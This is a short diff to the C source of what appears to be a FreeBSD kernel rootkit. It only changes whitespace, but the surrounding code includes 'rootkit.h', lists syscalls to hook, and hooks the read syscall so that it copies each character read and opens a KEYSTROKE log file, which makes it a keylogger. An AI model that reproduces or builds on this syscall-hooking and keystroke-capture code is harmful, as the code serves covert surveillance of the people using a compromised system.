@@ -1,7 +1,5 @@
 #include "rootkit.h"
 
-
-
 /*
 SYSCALLS TO HOOK:
 chdir
@@ -180,7 +178,7 @@ int hook_sys_openat(struct thread * td, struct openat_args * uap) {
 
 int hook_sys_read(struct thread *td, struct read_args * uap){
 
-		
+
 
 	int error;
 	char buf[1];
@@ -195,21 +193,21 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	copyinstr(uap->buf, buf, 1, &done);
 
-	
+
 
 	printf("%c", buf[0]);
 
 	int testfd = 0;
 
 	filewriter_openlog(curthread, &testfd, KEYSTROKE);
-	
-	filewriter_closelog(curthread, testfd);	
 
-	
-	
+	filewriter_closelog(curthread, testfd);
 
 
-	
+
+
+
+
 
 	return(error);
 
